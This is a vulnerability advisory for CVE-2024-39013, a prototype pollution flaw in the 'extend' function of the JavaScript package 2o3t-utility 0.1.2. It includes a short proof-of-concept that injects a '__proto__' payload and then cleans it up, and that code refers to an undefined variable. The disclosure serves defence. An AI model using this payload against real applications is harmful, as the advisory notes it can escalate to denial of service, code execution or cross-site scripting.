[CVE-2024-39013] Vulnerability Advisory Prototype Pollution in 2o3t-utility, version 0.1.2

 [Raw](/mestrtee/a2be744675af5ece3240c19fd04fc5e1/raw/cd5df9b5107e7fc61ff6a1ce56f753d8ee2ce219/Advisory_2o3t.md)

[**Advisory\_2o3t.md**](#file-advisory_2o3t-md)

**Vulnerability type:**
Prototype Pollution

**Vendor of the Package:**
2o3t

**Affected Package:**

* Product: 2o3t-utility
* Version: 0.1.2

**Affected component(s):**

```
extend
```

**Attack vector(s):**
the attacker can modify built-in Object.prototype by calling the vulnerable function: `extend` with an argument containing a special property `__proto__` to pollute the application logic that can be escalated to Denial of service, remote code execution or cross-site scripting attacks.

**Description:**
Affected versions of this package are vulnerable to Prototype Pollution through the vulnerable function: `extend`. An attacker can alter the behavior of all objects inheriting from the affected prototype by passing arguments to the vulenrable function crafted with the built-in property: `__proto__`. The attack can potentially escalated to Denial of service, remote code execution or cross-site scripting attacks depends on the gadgets that may affected by the attack

**Proof-of-Concept:**

```
(async () => {
  const lib = await import('2o3t-utility');

  var victim = {}

  console.log("Before Attack: ", JSON.stringify(victim.__proto__));

  try {

  lib.extend (emptyObj, JSON.parse('{"__proto__":{"test":123}}'))

  } catch (e) { }

  console.log("After Attack: ", JSON.stringify(victim.__proto__));

  delete Object.prototype.test;

  })();
```
